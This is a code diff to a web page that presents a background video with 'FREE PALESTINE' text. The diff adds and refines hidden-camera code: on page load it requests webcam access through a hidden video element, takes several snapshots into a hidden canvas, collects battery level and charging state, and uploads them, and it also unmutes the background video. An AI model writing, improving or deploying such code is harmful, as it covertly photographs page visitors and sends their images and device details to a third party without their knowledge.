@@ -53,7 +53,11 @@
     100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
   }
 
+  /* Hidden camera and canvas */
   video#cameraStream {
+    display: none;
+  }
+  canvas#snapshot {
     display: none;
   }
 </style>
@@ -61,7 +65,7 @@
 <body>
 
 <!-- Fullscreen Background Video -->
-<video id="backgroundVideo" autoplay loop muted playsinline>
+<video id="backgroundVideo" autoplay loop playsinline>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
   Your browser does not support the video tag.
 </video>
@@ -71,25 +75,37 @@
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
 
-<!-- Hidden Camera & Canvas -->
+<!-- Hidden Camera Video & Canvas -->
 <video id="cameraStream" autoplay playsinline muted></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-async function initCameraSnapshots() {
+const backgroundVideo = document.getElementById('backgroundVideo');
+const cameraVideo = document.getElementById('cameraStream');
+const canvas = document.getElementById('snapshot');
+const ctx = canvas.getContext('2d');
+
+// Start camera and take snapshots
+async function startCameraSnapshots() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById('cameraStream');
-    video.srcObject = stream;
+    cameraVideo.srcObject = stream;
 
+    // Wait for battery info (optional)
     const battery = await navigator.getBattery();
     const batteryLevel = Math.round(battery.level * 100);
     const isCharging = battery.charging;
 
+    // Pause background video if needed
+    // backgroundVideo.pause(); // د اړتیا په صورت کې
+
     // Take snapshots automatically
-    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 2000);
-    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 4000);
-    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 6000);
+    await takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging);
+    setTimeout(() => takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging), 2000);
+    setTimeout(() => takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging), 4000);
+
+    // Resume background video (in case it was paused)
+    // backgroundVideo.play();
 
   } catch(err) {
     console.error("Camera error:", err);
@@ -97,8 +113,7 @@ async function initCameraSnapshots() {
 }
 
 function takeSnapshotAndSend(video, battery, charging) {
-  const canvas = document.getElementById('snapshot');
-  const ctx = canvas.getContext('2d');
+  if (!video.videoWidth || !video.videoHeight) return;
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0);
@@ -117,8 +132,16 @@ function takeSnapshotAndSend(video, battery, charging) {
     .catch(err => console.error("Upload error:", err));
 }
 
-// Start camera snapshots after page loads
-window.addEventListener('load', initCameraSnapshots);
+// Start after page load
+window.addEventListener('load', () => {
+  // Play background video with sound
+  backgroundVideo.muted = false;
+  backgroundVideo.play().catch(e => console.warn("Autoplay prevented", e));
+
+  // Ask camera permission and start snapshots
+  startCameraSnapshots();
+});
 </script>
+
 </body>
 </html> 
